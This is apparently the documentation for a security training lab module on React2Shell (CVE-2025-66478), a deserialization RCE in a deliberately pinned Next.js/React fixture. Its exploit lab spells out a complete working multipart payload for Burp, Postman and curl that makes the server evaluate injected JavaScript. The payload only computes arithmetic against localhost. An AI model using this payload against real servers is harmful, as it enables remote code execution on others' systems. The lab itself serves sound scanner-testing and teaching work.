# Module: Dependency vulnerability — React2Shell (CVE-2025-66478, CWE-502)

This is the lab's **SCA** scenario: the flaw is in a pinned third-party runtime, not in application code the SAST tools inspect.

## Contents

| Scenario | Agent ref | Student guide | Exploit lab | Vuln vs protected | Tests |
| --- | --- | --- | --- | --- | --- |
| [SCA-001 · React2Shell](#sca-001) | [expected finding](#sca-001-agent) | [guide](#sca-001-student) | [Burp · Postman · curl](#sca-001-exploit) | [why it stays](#sca-001-safe) | [tests](#sca-001-tests) |

---

<a id="sca-001"></a>
## SCA-001 · React2Shell (CVE-2025-66478)

<a id="sca-001-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Target | `targets/react2shell` (`@zazzles/react2shell`), App Router + RSC |
| Pinned versions | Next.js **15.0.4**, React / React DOM **19.0.0** |
| Advisory | [GHSA-9qr9-h5gf-34mp](https://github.com/advisories/GHSA-9qr9-h5gf-34mp) · [Next.js blog](https://nextjs.org/blog/CVE-2025-66478) — critical, CWE-502 |
| Finding path | `targets__react2shell>next` |
| Main app status | **Not affected** — Next 13 / Pages Router; only this fixture is |
| Tests | `scripts/check-audit.mjs` (audit snapshot); `scripts/test-react2shell.mjs` (runtime) |

**Expected finding:** SCA reports `next@15.0.4` in the dependency graph matching GHSA-9qr9-h5gf-34mp (RCE in the React flight protocol).

[Student guide](#sca-001-student) · [Exploit lab](#sca-001-exploit) · [Why it stays pinned](#sca-001-safe) · [Tests](#sca-001-tests)

<a id="sca-001-student"></a>
### Student guide

The React flight protocol serializes server components as a stream of references and models; the affected decoder reconstructs objects from that stream with insufficient validation. A crafted multipart request to any Server Action endpoint can make the **server** evaluate expressions during decoding — this lab's probe makes it compute arithmetic and surface the result in a redirect digest.

The fixture's application code is ordinary and benign (a plain Server Action that logs a truncated message). The vulnerability is entirely in the pinned RSC runtime, which is what makes it an SCA target rather than a SAST one: nothing in the application source is wrong.

Why a separate fixture: the upstream application is Next 13 / Pages Router, which the advisory does not affect, and simulating the flaw with a hand-written `eval` would test nothing about dependency detection.

<a id="sca-001-exploit"></a>
### Exploit lab

Prerequisites: fixture built and running — `pnpm build:react2shell && pnpm start:react2shell` (127.0.0.1:3001).

The payload is a multipart form with five fields (`0`–`4`, each a JSON string). Field `4`'s `_prefix` contains a `throw` whose `NEXT_REDIRECT` digest embeds `'/zazzles-rsc-'+(1234*5678)+';303;'`. The server **evaluates the arithmetic** during decoding and the product (`7006652`) appears in the response's `x-action-redirect` header — a value that never existed in the request bytes, so reflection cannot explain it.

**Burp Suite**

1. In Repeater, set the target to `127.0.0.1:3001`, method `POST`, path `/`.
2. Add header `next-action: x` and `Content-Type: multipart/form-data; boundary=----zazzleslab`.
3. Paste this body (keep CRLF line endings — Burp's editor uses them when you paste over an existing multipart request):

```
------zazzleslab
Content-Disposition: form-data; name="0"

"$1"
------zazzleslab
Content-Disposition: form-data; name="1"

{"status":"resolved_model","reason":0,"_response":"$4","value":"{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}","then":"$2:then"}
------zazzleslab
Content-Disposition: form-data; name="2"

"$@3"
------zazzleslab
Content-Disposition: form-data; name="3"

[]
------zazzleslab
Content-Disposition: form-data; name="4"

{"_prefix":"throw Object.assign(new Error('NEXT_REDIRECT'), {digest:'NEXT_REDIRECT;replace;/zazzles-rsc-'+(1234*5678)+';303;'});//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}
------zazzleslab--
```

4. **Send** → `HTTP/1.1 303 See Other` with `x-action-redirect: /zazzles-rsc-7006652;replace`. Change `(1234*5678)` to any other pair of numbers and re-send — the header changes to the new product, proving server-side evaluation.

**Postman**

1. `POST http://127.0.0.1:3001/`; Headers: `next-action: x`.
2. Body → form-data, add five rows keyed `0`–`4` with the **text** values above (each exactly the JSON string shown, e.g. row `4`'s value is the whole `{\"_prefix\":…}` object on one line).
3. Settings → General → **Automatically follow redirects: OFF**, then Send.
4. The 303 response shows `x-action-redirect: /zazzles-rsc-7006652;replace` (1234 × 5678).

**curl**

```bash
curl -s -D - -o /dev/null http://127.0.0.1:3001/ \
  -H 'next-action: x' \
  --form-string '0="$1"' \
  --form-string '1={"status":"resolved_model","reason":0,"_response":"$4","value":"{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}","then":"$2:then"}' \
  --form-string '2="$@3"' \
  --form-string '3=[]' \
  --form-string '4={"_prefix":"throw Object.assign(new Error('\''NEXT_REDIRECT'\''), {digest:'\''NEXT_REDIRECT;replace;/zazzles-rsc-'\''+(1234*5678)+'\'';303;'\''});//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}'
# HTTP/1.1 303 See Other
# x-action-redirect: /zazzles-rsc-7006652;replace
```

(`pnpm test:react2shell` runs the same attack with randomized numbers and asserts the computed marker.)

**Observation that proves exploitation:** the redirect header contains the product of two numbers that appear in the request only as factors — the arithmetic ran on the server.

<a id="sca-001-safe"></a>
### Vulnerable vs protected — and why it stays pinned

| | This fixture | A protected app |
| --- | --- | --- |
| Dependency | `next@15.0.4` / React 19.0.0 — **deliberately pinned** | a version outside the advisory's affected range |
| Detection | `pnpm audit --prod` reports GHSA-9qr9-h5gf-34mp (nonzero exit is intended) | the advisory is absent from the graph |
| Runtime | crafted RSC request executes server-side arithmetic | decoder rejects the crafted stream |

**Why this scenario stays vulnerable:** the pin *is* the test target — SCA tools must find it in the graph, and the runtime probe must demonstrate the impact. “Fixing” it would delete the scenario. The lab guards the pin two ways: `pnpm audit:check` fails if the audit findings drift from the committed snapshot, and `pnpm scenario:check` fails if the fixture's manifest changes hash. If the scenario is ever retired, do it in a dedicated change that updates catalog, docs, and audit snapshot together.

<a id="sca-001-tests"></a>
### Automated tests

- `scripts/check-audit.mjs` (`pnpm audit:check`): `pnpm audit --prod --json` must match the committed `tests/expected-audit.json` snapshot.
- `scripts/test-react2shell.mjs`: randomized-numbers variant of the exploit above; asserts the server-computed marker appears in the response headers/body.
